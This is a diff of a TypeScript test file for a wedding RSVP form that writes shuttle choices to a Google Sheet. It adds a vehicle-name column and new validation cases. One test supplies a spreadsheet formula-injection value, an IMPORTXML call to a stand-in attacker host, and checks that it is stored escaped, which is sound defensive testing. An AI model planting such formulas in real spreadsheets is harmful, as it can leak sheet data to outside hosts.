@@ -118,8 +118,8 @@ describe("Direct RSVP → Google Apps Script", () => {
       type: "wedding-rsvp", nonce, ok: true, requestId: valid.requestId, version: 2,
     });
     expect(google.rows[1]?.slice(2, 6)).toEqual(["Nguyễn An", "attending", 2, "Hẹn gặp hai bạn!"]);
-    expect(google.rows[0]?.slice(7, 12)).toEqual(["Xe đưa đón", "Chiều đi", "Trạm đón", "Chiều về", "Trạm trả"]);
-    expect(google.rows[1]?.slice(7, 12)).toEqual(["", "", "", "", ""]);
+    expect(google.rows[0]?.slice(7, 13)).toEqual(["Xe đưa đón", "Chiều đi", "Tên xe", "Trạm đón", "Chiều về", "Trạm trả"]);
+    expect(google.rows[1]?.slice(7, 13)).toEqual(["", "", "", "", "", ""]);
     expect(google.locked).toBe(false);
   });
 
@@ -173,33 +173,34 @@ describe("Direct RSVP → Google Apps Script", () => {
       transport: "shuttle",
       outbound: "trip-1",
       station: " Công viên 30/4, Quận 1 ",
+      vehicle: " Xe 16 chỗ ",
       returnRide: "same",
       returnStation: "Bến xe Miền Đông mới",
     };
     expect(google.post(body)).toMatchObject({ ok: true, version: 2, requestId: body.requestId });
-    expect(google.rows[1]?.slice(7, 12)).toEqual([
-      "Dùng xe", "Chuyến 1", "Công viên 30/4, Quận 1", "Xe cũ", "Bến xe Miền Đông mới",
+    expect(google.rows[1]?.slice(7, 13)).toEqual([
+      "Dùng xe", "Chuyến 1", "Xe 16 chỗ", "Công viên 30/4, Quận 1", "Xe cũ", "Bến xe Miền Đông mới",
     ]);
     expect(JSON.parse(String(google.rows[1]?.[6]))).toMatchObject({
-      station: "Công viên 30/4, Quận 1", returnStation: "Bến xe Miền Đông mới",
+      vehicle: "Xe 16 chỗ", station: "Công viên 30/4, Quận 1", returnStation: "Bến xe Miền Đông mới",
     });
     const renamed = {
       ...valid, requestId: crypto.randomUUID(), transport: "shuttle", outbound: "trip-2",
-      station: "Ngã tư Thủ Đức", returnRide: "self",
+      vehicle: "Xe Innova", station: "Ngã tư Thủ Đức", returnRide: "self",
     };
     expect(google.post(renamed).ok).toBe(true);
-    expect(google.rows[2]?.slice(7, 12)).toEqual(["Dùng xe", "Chuyến 2", "Ngã tư Thủ Đức", "Tự về", ""]);
+    expect(google.rows[2]?.slice(7, 13)).toEqual(["Dùng xe", "Chuyến 2", "Xe Innova", "Ngã tư Thủ Đức", "Tự về", ""]);
     expect(google.post({
       ...valid, requestId: crypto.randomUUID(), transport: "shuttle", outbound: "self", returnRide: "self",
     }).ok).toBe(true);
-    expect(google.rows[3]?.slice(7, 12)).toEqual(["Dùng xe", "Tự đi", "", "Tự về", ""]);
+    expect(google.rows[3]?.slice(7, 13)).toEqual(["Dùng xe", "Tự đi", "", "", "Tự về", ""]);
     expect(google.post({
       ...valid, requestId: crypto.randomUUID(), transport: "own",
     }).ok).toBe(true);
-    expect(google.rows[4]?.slice(7, 12)).toEqual(["Tự sắp xếp", "", "", "", ""]);
+    expect(google.rows[4]?.slice(7, 13)).toEqual(["Tự sắp xếp", "", "", "", "", ""]);
     const formula = { ...body, requestId: crypto.randomUUID(), station: "=IMPORTXML(\"https://attacker.example\",\"//a\")" };
     expect(google.post(formula).ok).toBe(true);
-    expect(google.rows[5]?.[9]).toBe("'" + formula.station);
+    expect(google.rows[5]?.[10]).toBe("'" + formula.station);
   });
 
   test("extends an old RSVP header with the shuttle text columns", () => {
@@ -207,7 +208,7 @@ describe("Direct RSVP → Google Apps Script", () => {
     google.rows[0] = google.rows[0]!.slice(0, 7);
     const next = { ...valid, requestId: crypto.randomUUID(), transport: "own" as const };
     expect(google.post(next).ok).toBe(true);
-    expect(google.rows[0]?.slice(7, 12)).toEqual(["Xe đưa đón", "Chiều đi", "Trạm đón", "Chiều về", "Trạm trả"]);
+    expect(google.rows[0]?.slice(7, 13)).toEqual(["Xe đưa đón", "Chiều đi", "Tên xe", "Trạm đón", "Chiều về", "Trạm trả"]);
     google.rows[0]![7] = "Sai";
     expect(google.post({ ...next, requestId: crypto.randomUUID() }).error).toBe("service_unavailable");
     expect(google.rows).toHaveLength(3);
@@ -224,7 +225,8 @@ describe("Direct RSVP → Google Apps Script", () => {
     { transport: "shuttle", outbound: "self", station: "Hàng Xanh", returnRide: "self" },
     { transport: "shuttle", outbound: "none", returnRide: "same", returnStation: "Hàng Xanh" },
     { transport: "shuttle", outbound: "trip-1", station: "Suối Tiên", returnRide: "bus" },
-    { transport: "shuttle", outbound: "trip-1", station: "Suối Tiên", returnRide: "self", returnStation: "Suối Tiên" },
+    { transport: "shuttle", outbound: "self", vehicle: "Xe 1", returnRide: "self" },
+    { transport: "shuttle", outbound: "trip-1", vehicle: " ", station: "Suối Tiên", returnRide: "self" },
   ])("rejects a malformed shuttle answer before writing: %j", (fields) => {
     expect(google.post({ ...valid, requestId: crypto.randomUUID(), ...fields }).error).toBe("invalid_request");
     expect(google.rows).toHaveLength(0);
